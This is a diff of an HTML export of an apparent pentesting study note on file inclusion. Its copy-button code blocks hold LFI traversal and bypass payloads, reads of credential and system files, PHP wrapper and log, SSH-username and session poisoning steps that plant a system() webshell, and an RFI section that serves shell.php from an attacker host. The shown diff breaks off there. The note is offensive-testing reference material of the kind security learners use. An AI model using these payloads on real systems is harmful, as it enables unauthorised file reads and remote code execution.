@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:54 -->
+<!-- 2026-07-30 Thu 22:13 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>File Inclusion File Inclusion</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,33 +886,33 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgf9c6d4b">1. Identifying File Inclusion</a></li>
-<li><a href="#orgaa7d0e4">2. Local File Inclusion (LFI)</a>
+<li><a href="#orgcb0a899">1. Identifying File Inclusion</a></li>
+<li><a href="#orgc04b4e0">2. Local File Inclusion (LFI)</a>
 <ul>
-<li><a href="#orgc944959">Basic Path Traversal</a></li>
-<li><a href="#orgdb930c6">Bypass Techniques</a></li>
-<li><a href="#orgb16291e">PHP Wrappers</a></li>
+<li><a href="#org618c667">Basic Path Traversal</a></li>
+<li><a href="#org2ee46f4">Bypass Techniques</a></li>
+<li><a href="#org7150759">PHP Wrappers</a></li>
 </ul>
 </li>
-<li><a href="#org22ef9fa">3. LFI to RCE</a>
+<li><a href="#org939f815">3. LFI to RCE</a>
 <ul>
-<li><a href="#orgaa59af8">Log Poisoning — Apache / Nginx</a></li>
-<li><a href="#orgb0007ca">Log Poisoning — SSH Auth Log</a></li>
-<li><a href="#orgf2d09b8">/proc/self/environ</a></li>
-<li><a href="#org14e9e15">PHP Session Poisoning</a></li>
-<li><a href="#org4f16c52">php://input</a></li>
+<li><a href="#org15e2505">Log Poisoning — Apache / Nginx</a></li>
+<li><a href="#org3935383">Log Poisoning — SSH Auth Log</a></li>
+<li><a href="#orgb7e5a06">/proc/self/environ</a></li>
+<li><a href="#org7f71a83">PHP Session Poisoning</a></li>
+<li><a href="#org8c4696e">php://input</a></li>
 </ul>
 </li>
-<li><a href="#orgf35a2fb">4. Remote File Inclusion (RFI)</a></li>
-<li><a href="#orga435af8">5. High-Value Files to Read</a>
+<li><a href="#orgb44b3dc">4. Remote File Inclusion (RFI)</a></li>
+<li><a href="#org8825a6c">5. High-Value Files to Read</a>
 <ul>
-<li><a href="#org5c8689e">Linux</a></li>
-<li><a href="#org641dba7">Windows</a></li>
+<li><a href="#org064ecf8">Linux</a></li>
+<li><a href="#orga85df76">Windows</a></li>
 </ul>
 </li>
-<li><a href="#org060c30d">6. Testing Methodology</a></li>
-<li><a href="#org755866e">7. Reporting Template</a></li>
-<li><a href="#org97b5f05">Tips</a></li>
+<li><a href="#org137f241">6. Testing Methodology</a></li>
+<li><a href="#org26840d0">7. Reporting Template</a></li>
+<li><a href="#org0958bec">Tips</a></li>
 </ul>
 </div>
 </div>
@@ -915,15 +933,15 @@ Related: <a href="20260206T060721--path-traversal__cybersecurity_technique.html"
          <a href="20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
          <a href="20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
 </p>
-<div id="outline-container-orgf9c6d4b" class="outline-2">
-<h2 id="orgf9c6d4b">1. Identifying File Inclusion</h2>
-<div class="outline-text-2" id="text-orgf9c6d4b">
+<div id="outline-container-orgcb0a899" class="outline-2">
+<h2 id="orgcb0a899">1. Identifying File Inclusion</h2>
+<div class="outline-text-2" id="text-orgcb0a899">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ac9d75c85fb442fe927fb6b0e241c6e8>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_089bff1292e0471fad5a2632808afecb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ac9d75c85fb442fe927fb6b0e241c6e8=document.querySelector('button[name=btn_ac9d75c85fb442fe927fb6b0e241c6e8]');
-copyBtnbtn_ac9d75c85fb442fe927fb6b0e241c6e8.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Vulnerable parameter patterns\n?page=home\n?file=about\n?template=main\n?lang=en\n?include=header\n?view=index\n?doc=report\n?path=content\n\n# Test with a known file\n?page=../../../../etc/passwd           # Linux\n?page=../../../../windows/win.ini      # Windows\n`);copyBtnbtn_ac9d75c85fb442fe927fb6b0e241c6e8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ac9d75c85fb442fe927fb6b0e241c6e8.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_089bff1292e0471fad5a2632808afecb=document.querySelector('button[name=btn_089bff1292e0471fad5a2632808afecb]');
+copyBtnbtn_089bff1292e0471fad5a2632808afecb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Vulnerable parameter patterns\n?page=home\n?file=about\n?template=main\n?lang=en\n?include=header\n?view=index\n?doc=report\n?path=content\n\n# Test with a known file\n?page=../../../../etc/passwd           # Linux\n?page=../../../../windows/win.ini      # Windows\n`);copyBtnbtn_089bff1292e0471fad5a2632808afecb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_089bff1292e0471fad5a2632808afecb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -944,19 +962,19 @@ let res = copyTextToClipboard(`# Vulnerable parameter patterns\n?page=home\n?fil
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgaa7d0e4" class="outline-2">
-<h2 id="orgaa7d0e4">2. Local File Inclusion (LFI)</h2>
-<div class="outline-text-2" id="text-orgaa7d0e4">
+<div id="outline-container-orgc04b4e0" class="outline-2">
+<h2 id="orgc04b4e0">2. Local File Inclusion (LFI)</h2>
+<div class="outline-text-2" id="text-orgc04b4e0">
 </div>
-<div id="outline-container-orgc944959" class="outline-3">
-<h3 id="orgc944959">Basic Path Traversal</h3>
-<div class="outline-text-3" id="text-orgc944959">
+<div id="outline-container-org618c667" class="outline-3">
+<h3 id="org618c667">Basic Path Traversal</h3>
+<div class="outline-text-3" id="text-org618c667">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6fb24252cf874974aeb8c85c786fe1a9>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_455e2015fcba4496999470ea74bc3d77>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_6fb24252cf874974aeb8c85c786fe1a9=document.querySelector('button[name=btn_6fb24252cf874974aeb8c85c786fe1a9]');
-copyBtnbtn_6fb24252cf874974aeb8c85c786fe1a9.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Linux targets — confirm LFI\n?file=../../../../etc/passwd\n?file=../../../../etc/shadow           # requires root\n?file=../../../../etc/hosts\n?file=../../../../proc/version         # kernel version\n?file=../../../../proc/self/environ    # environment variables\n\n# Windows targets\n?file=../../../../windows/win.ini\n?file=../../../../windows/system32\\drivers\\etc\\hosts\n?file=../../../../boot.ini             # older systems\n`);copyBtnbtn_6fb24252cf874974aeb8c85c786fe1a9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6fb24252cf874974aeb8c85c786fe1a9.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_455e2015fcba4496999470ea74bc3d77=document.querySelector('button[name=btn_455e2015fcba4496999470ea74bc3d77]');
+copyBtnbtn_455e2015fcba4496999470ea74bc3d77.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Linux targets — confirm LFI\n?file=../../../../etc/passwd\n?file=../../../../etc/shadow           # requires root\n?file=../../../../etc/hosts\n?file=../../../../proc/version         # kernel version\n?file=../../../../proc/self/environ    # environment variables\n\n# Windows targets\n?file=../../../../windows/win.ini\n?file=../../../../windows/system32\\drivers\\etc\\hosts\n?file=../../../../boot.ini             # older systems\n`);copyBtnbtn_455e2015fcba4496999470ea74bc3d77.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_455e2015fcba4496999470ea74bc3d77.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -975,15 +993,15 @@ let res = copyTextToClipboard(`# Linux targets — confirm LFI\n?file=../../../.
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgdb930c6" class="outline-3">
-<h3 id="orgdb930c6">Bypass Techniques</h3>
-<div class="outline-text-3" id="text-orgdb930c6">
+<div id="outline-container-org2ee46f4" class="outline-3">
+<h3 id="org2ee46f4">Bypass Techniques</h3>
+<div class="outline-text-3" id="text-org2ee46f4">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_23f6f1654c7b4c6fa06f1bb6650ea3bd>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ef1ebf0e8ecd431598d94d571a1f7f4c>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_23f6f1654c7b4c6fa06f1bb6650ea3bd=document.querySelector('button[name=btn_23f6f1654c7b4c6fa06f1bb6650ea3bd]');
-copyBtnbtn_23f6f1654c7b4c6fa06f1bb6650ea3bd.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Null byte — bypass appended extension (PHP < 5.3.4)\n?file=../../../../etc/passwd%00\n?file=../../../../etc/passwd%00.png\n\n# URL encoding\n?file=..%2F..%2F..%2Fetc%2Fpasswd\n?file=..%252F..%252Fetc%252Fpasswd    # double encoded\n\n# Path truncation (older PHP)\n?file=../../../../etc/passwd.................   # truncate appended extension\n\n# Filter bypass — if ../ is stripped\n?file=....//....//....//etc/passwd     # strips to ../\n?file=..././..././etc/passwd           # alternate separators\n\n# Absolute path (if no prefix added)\n?file=/etc/passwd\n`);copyBtnbtn_23f6f1654c7b4c6fa06f1bb6650ea3bd.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_23f6f1654c7b4c6fa06f1bb6650ea3bd.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_ef1ebf0e8ecd431598d94d571a1f7f4c=document.querySelector('button[name=btn_ef1ebf0e8ecd431598d94d571a1f7f4c]');
+copyBtnbtn_ef1ebf0e8ecd431598d94d571a1f7f4c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Null byte — bypass appended extension (PHP < 5.3.4)\n?file=../../../../etc/passwd%00\n?file=../../../../etc/passwd%00.png\n\n# URL encoding\n?file=..%2F..%2F..%2Fetc%2Fpasswd\n?file=..%252F..%252Fetc%252Fpasswd    # double encoded\n\n# Path truncation (older PHP)\n?file=../../../../etc/passwd.................   # truncate appended extension\n\n# Filter bypass — if ../ is stripped\n?file=....//....//....//etc/passwd     # strips to ../\n?file=..././..././etc/passwd           # alternate separators\n\n# Absolute path (if no prefix added)\n?file=/etc/passwd\n`);copyBtnbtn_ef1ebf0e8ecd431598d94d571a1f7f4c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ef1ebf0e8ecd431598d94d571a1f7f4c.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1008,15 +1026,15 @@ let res = copyTextToClipboard(`# Null byte — bypass appended extension (PHP < 
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgb16291e" class="outline-3">
-<h3 id="orgb16291e">PHP Wrappers</h3>
-<div class="outline-text-3" id="text-orgb16291e">
+<div id="outline-container-org7150759" class="outline-3">
+<h3 id="org7150759">PHP Wrappers</h3>
+<div class="outline-text-3" id="text-org7150759">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2783e8395aec4f7f9e6df0e6b1bdcaca>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_df033f52f5cf4acfa9e93bc52b4f8377>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2783e8395aec4f7f9e6df0e6b1bdcaca=document.querySelector('button[name=btn_2783e8395aec4f7f9e6df0e6b1bdcaca]');
-copyBtnbtn_2783e8395aec4f7f9e6df0e6b1bdcaca.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Read file source as base64 — bypasses output filters\n?file=php://filter/convert.base64-encode/resource=/etc/passwd\n?file=php://filter/convert.base64-encode/resource=index.php\n# Decode: echo \"<base64>\" | base64 -d\n\n# Execute arbitrary PHP from POST body\n?file=php://input\n# POST body: <?php system($_GET['cmd']); ?>\n\n# Embed and execute PHP directly in URL\n?file=data://text/plain,<?php system('id'); ?>\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# Zip wrapper (if file upload exists)\n# Upload zip containing shell.php, then:\n?file=zip://uploads/file.zip#shell\n`);copyBtnbtn_2783e8395aec4f7f9e6df0e6b1bdcaca.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2783e8395aec4f7f9e6df0e6b1bdcaca.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_df033f52f5cf4acfa9e93bc52b4f8377=document.querySelector('button[name=btn_df033f52f5cf4acfa9e93bc52b4f8377]');
+copyBtnbtn_df033f52f5cf4acfa9e93bc52b4f8377.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Read file source as base64 — bypasses output filters\n?file=php://filter/convert.base64-encode/resource=/etc/passwd\n?file=php://filter/convert.base64-encode/resource=index.php\n# Decode: echo \"<base64>\" | base64 -d\n\n# Execute arbitrary PHP from POST body\n?file=php://input\n# POST body: <?php system($_GET['cmd']); ?>\n\n# Embed and execute PHP directly in URL\n?file=data://text/plain,<?php system('id'); ?>\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# Zip wrapper (if file upload exists)\n# Upload zip containing shell.php, then:\n?file=zip://uploads/file.zip#shell\n`);copyBtnbtn_df033f52f5cf4acfa9e93bc52b4f8377.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_df033f52f5cf4acfa9e93bc52b4f8377.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1041,24 +1059,24 @@ let res = copyTextToClipboard(`# Read file source as base64 — bypasses output 
 </div>
 </div>
 </div>
-<div id="outline-container-org22ef9fa" class="outline-2">
-<h2 id="org22ef9fa">3. LFI to RCE</h2>
-<div class="outline-text-2" id="text-org22ef9fa">
+<div id="outline-container-org939f815" class="outline-2">
+<h2 id="org939f815">3. LFI to RCE</h2>
+<div class="outline-text-2" id="text-org939f815">
 </div>
-<div id="outline-container-orgaa59af8" class="outline-3">
-<h3 id="orgaa59af8">Log Poisoning — Apache / Nginx</h3>
-<div class="outline-text-3" id="text-orgaa59af8">
+<div id="outline-container-org15e2505" class="outline-3">
+<h3 id="org15e2505">Log Poisoning — Apache / Nginx</h3>
+<div class="outline-text-3" id="text-org15e2505">
 <p>
 Inject PHP into a log file via User-Agent or URL, then include
 the log file via LFI.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b0da13820bc94338b8ecc8442f9ebe22>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_67fccf7da4b44faf8848b2f1527833a8>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b0da13820bc94338b8ecc8442f9ebe22=document.querySelector('button[name=btn_b0da13820bc94338b8ecc8442f9ebe22]');
-copyBtnbtn_b0da13820bc94338b8ecc8442f9ebe22.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Step 1 — inject PHP into access log via User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Step 2 — include the log file\n?file=../../../../var/log/apache2/access.log&cmd=id\n?file=../../../../var/log/nginx/access.log&cmd=id\n\n# Alternative — inject via URL (appears in log as 404)\ncurl http://$TARGET/<?php system(\\$_GET['cmd']); ?>\n\n# Common log locations\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/proc/self/fd/1                        # stdin — current process\n`);copyBtnbtn_b0da13820bc94338b8ecc8442f9ebe22.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b0da13820bc94338b8ecc8442f9ebe22.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_67fccf7da4b44faf8848b2f1527833a8=document.querySelector('button[name=btn_67fccf7da4b44faf8848b2f1527833a8]');
+copyBtnbtn_67fccf7da4b44faf8848b2f1527833a8.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Step 1 — inject PHP into access log via User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Step 2 — include the log file\n?file=../../../../var/log/apache2/access.log&cmd=id\n?file=../../../../var/log/nginx/access.log&cmd=id\n\n# Alternative — inject via URL (appears in log as 404)\ncurl http://$TARGET/<?php system(\\$_GET['cmd']); ?>\n\n# Common log locations\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/proc/self/fd/1                        # stdin — current process\n`);copyBtnbtn_67fccf7da4b44faf8848b2f1527833a8.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_67fccf7da4b44faf8848b2f1527833a8.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1082,15 +1100,15 @@ let res = copyTextToClipboard(`# Step 1 — inject PHP into access log via User-
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgb0007ca" class="outline-3">
-<h3 id="orgb0007ca">Log Poisoning — SSH Auth Log</h3>
-<div class="outline-text-3" id="text-orgb0007ca">
+<div id="outline-container-org3935383" class="outline-3">
+<h3 id="org3935383">Log Poisoning — SSH Auth Log</h3>
+<div class="outline-text-3" id="text-org3935383">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0c9da83c368b41bfaa8f112a059b4b6d>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fbc11623d4094c2f9599b4a8ef973293>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0c9da83c368b41bfaa8f112a059b4b6d=document.querySelector('button[name=btn_0c9da83c368b41bfaa8f112a059b4b6d]');
-copyBtnbtn_0c9da83c368b41bfaa8f112a059b4b6d.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Inject PHP as SSH username — generates auth log entry\nssh '<?php system($_GET[\"cmd\"]); ?>'@$TARGET\n\n# Include SSH auth log\n?file=../../../../var/log/auth.log&cmd=id\n?file=../../../../var/log/secure&cmd=id    # RHEL/CentOS\n`);copyBtnbtn_0c9da83c368b41bfaa8f112a059b4b6d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0c9da83c368b41bfaa8f112a059b4b6d.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fbc11623d4094c2f9599b4a8ef973293=document.querySelector('button[name=btn_fbc11623d4094c2f9599b4a8ef973293]');
+copyBtnbtn_fbc11623d4094c2f9599b4a8ef973293.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject PHP as SSH username — generates auth log entry\nssh '<?php system($_GET[\"cmd\"]); ?>'@$TARGET\n\n# Include SSH auth log\n?file=../../../../var/log/auth.log&cmd=id\n?file=../../../../var/log/secure&cmd=id    # RHEL/CentOS\n`);copyBtnbtn_fbc11623d4094c2f9599b4a8ef973293.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fbc11623d4094c2f9599b4a8ef973293.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1104,15 +1122,15 @@ let res = copyTextToClipboard(`# Inject PHP as SSH username — generates auth l
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgf2d09b8" class="outline-3">
-<h3 id="orgf2d09b8">/proc/self/environ</h3>
-<div class="outline-text-3" id="text-orgf2d09b8">
+<div id="outline-container-orgb7e5a06" class="outline-3">
+<h3 id="orgb7e5a06">/proc/self/environ</h3>
+<div class="outline-text-3" id="text-orgb7e5a06">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e94f80426c3241b7967c24c7b0e3b674>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_0af1f49995234683abe7a7b4e38aefa0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e94f80426c3241b7967c24c7b0e3b674=document.querySelector('button[name=btn_e94f80426c3241b7967c24c7b0e3b674]');
-copyBtnbtn_e94f80426c3241b7967c24c7b0e3b674.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Inject into User-Agent — appears in process environment\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Include proc environ\n?file=../../../../proc/self/environ&cmd=id\n`);copyBtnbtn_e94f80426c3241b7967c24c7b0e3b674.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e94f80426c3241b7967c24c7b0e3b674.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_0af1f49995234683abe7a7b4e38aefa0=document.querySelector('button[name=btn_0af1f49995234683abe7a7b4e38aefa0]');
+copyBtnbtn_0af1f49995234683abe7a7b4e38aefa0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject into User-Agent — appears in process environment\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$TARGET/\n\n# Include proc environ\n?file=../../../../proc/self/environ&cmd=id\n`);copyBtnbtn_0af1f49995234683abe7a7b4e38aefa0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0af1f49995234683abe7a7b4e38aefa0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1125,15 +1143,15 @@ let res = copyTextToClipboard(`# Inject into User-Agent — appears in process e
 </div></div>
 </div>
 </div>
-<div id="outline-container-org14e9e15" class="outline-3">
-<h3 id="org14e9e15">PHP Session Poisoning</h3>
-<div class="outline-text-3" id="text-org14e9e15">
+<div id="outline-container-org7f71a83" class="outline-3">
+<h3 id="org7f71a83">PHP Session Poisoning</h3>
+<div class="outline-text-3" id="text-org7f71a83">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_432ce1e626844d30a5fe8fbbe7cce5fa>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4068c5b71be046d083f8951e07590ae0>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_432ce1e626844d30a5fe8fbbe7cce5fa=document.querySelector('button[name=btn_432ce1e626844d30a5fe8fbbe7cce5fa]');
-copyBtnbtn_432ce1e626844d30a5fe8fbbe7cce5fa.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Step 1 — inject PHP into a session value via application input\n# (register/login with PHP payload as username)\n# Username: <?php system($_GET['cmd']); ?>\n\n# Step 2 — find the session file and include it\n?file=../../../../tmp/sess_<session_id>&cmd=id\n?file=../../../../var/lib/php/sessions/sess_<session_id>&cmd=id\n\n# Get session ID from browser cookies (PHPSESSID)\n`);copyBtnbtn_432ce1e626844d30a5fe8fbbe7cce5fa.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_432ce1e626844d30a5fe8fbbe7cce5fa.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4068c5b71be046d083f8951e07590ae0=document.querySelector('button[name=btn_4068c5b71be046d083f8951e07590ae0]');
+copyBtnbtn_4068c5b71be046d083f8951e07590ae0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Step 1 — inject PHP into a session value via application input\n# (register/login with PHP payload as username)\n# Username: <?php system($_GET['cmd']); ?>\n\n# Step 2 — find the session file and include it\n?file=../../../../tmp/sess_<session_id>&cmd=id\n?file=../../../../var/lib/php/sessions/sess_<session_id>&cmd=id\n\n# Get session ID from browser cookies (PHPSESSID)\n`);copyBtnbtn_4068c5b71be046d083f8951e07590ae0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4068c5b71be046d083f8951e07590ae0.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1150,15 +1168,15 @@ let res = copyTextToClipboard(`# Step 1 — inject PHP into a session value via 
 </div></div>
 </div>
 </div>
-<div id="outline-container-org4f16c52" class="outline-3">
-<h3 id="org4f16c52">php://input</h3>
-<div class="outline-text-3" id="text-org4f16c52">
+<div id="outline-container-org8c4696e" class="outline-3">
+<h3 id="org8c4696e">php://input</h3>
+<div class="outline-text-3" id="text-org8c4696e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a431d14c478344bcbe23f7b7cb97b247>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_08ad815048f74d08adb8836f271ebb3f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a431d14c478344bcbe23f7b7cb97b247=document.querySelector('button[name=btn_a431d14c478344bcbe23f7b7cb97b247]');
-copyBtnbtn_a431d14c478344bcbe23f7b7cb97b247.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Send PHP payload in POST body, include via php://input\ncurl -X POST \"http://$TARGET/page.php?file=php://input&cmd=id\" \\\n  -d \"<?php system(\\$_GET['cmd']); ?>\"\n`);copyBtnbtn_a431d14c478344bcbe23f7b7cb97b247.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a431d14c478344bcbe23f7b7cb97b247.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_08ad815048f74d08adb8836f271ebb3f=document.querySelector('button[name=btn_08ad815048f74d08adb8836f271ebb3f]');
+copyBtnbtn_08ad815048f74d08adb8836f271ebb3f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Send PHP payload in POST body, include via php://input\ncurl -X POST \"http://$TARGET/page.php?file=php://input&cmd=id\" \\\n  -d \"<?php system(\\$_GET['cmd']); ?>\"\n`);copyBtnbtn_08ad815048f74d08adb8836f271ebb3f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_08ad815048f74d08adb8836f271ebb3f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1170,20 +1188,20 @@ let res = copyTextToClipboard(`# Send PHP payload in POST body, include via php:
 </div>
 </div>
 </div>
-<div id="outline-container-orgf35a2fb" class="outline-2">
-<h2 id="orgf35a2fb">4. Remote File Inclusion (RFI)</h2>
-<div class="outline-text-2" id="text-orgf35a2fb">
+<div id="outline-container-orgb44b3dc" class="outline-2">
+<h2 id="orgb44b3dc">4. Remote File Inclusion (RFI)</h2>
+<div class="outline-text-2" id="text-orgb44b3dc">
 <p>
 Requires <code>allow_url_include = On</code> in <code>php.ini</code> — less common on
 modern servers but worth testing.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d654f043a0a14cc88b54abf690f433a1>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1072e160ad574ee59ffe2d8e4d19d068>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d654f043a0a14cc88b54abf690f433a1=document.querySelector('button[name=btn_d654f043a0a14cc88b54abf690f433a1]');
-copyBtnbtn_d654f043a0a14cc88b54abf690f433a1.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Host malicious PHP file on attacker\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8080\n\n# Include from target\n?file=http://$ATTACKER:8080/shell.php&cmd=id\n\n# HTTPS (if HTTP blocked)\n?file=https://$ATTACKER/shell.php&cmd=id\n\n# SMB (Windows targets)\n?file=\\\\$ATTACKER\\share\\shell.php\n`);copyBtnbtn_d654f043a0a14cc88b54abf690f433a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d654f043a0a14cc88b54abf690f433a1.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1072e160ad574ee59ffe2d8e4d19d068=document.querySelector('button[name=btn_1072e160ad574ee59ffe2d8e4d19d068]');
